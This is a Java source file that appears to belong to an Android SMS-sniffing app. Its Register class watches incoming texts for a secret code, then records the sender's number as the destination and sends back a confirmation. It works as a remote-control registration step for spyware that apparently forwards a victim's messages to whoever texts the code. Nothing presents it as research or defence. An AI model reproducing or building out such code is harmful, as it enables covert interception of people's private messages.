package sms.sniff.behaviors;

import sms.sniff.core.Constants;
import sms.sniff.utils.SMS;
import sms.sniff.utils.SharedPreferencesEditor;
import android.content.Context;
import android.telephony.SmsMessage;

public class Register implements Behavior{
	
	private Context context;

	public Register(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {
		String originPhoneNumber = sms.getOriginatingAddress();
		
		Constants.destination = originPhoneNumber;
		new SharedPreferencesEditor(context).register(originPhoneNumber);
		
		new SMS(".").sendConfirmation();
	}
	
	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		return messageBody.contains(Constants.messageCode_register); 
	}
	
}
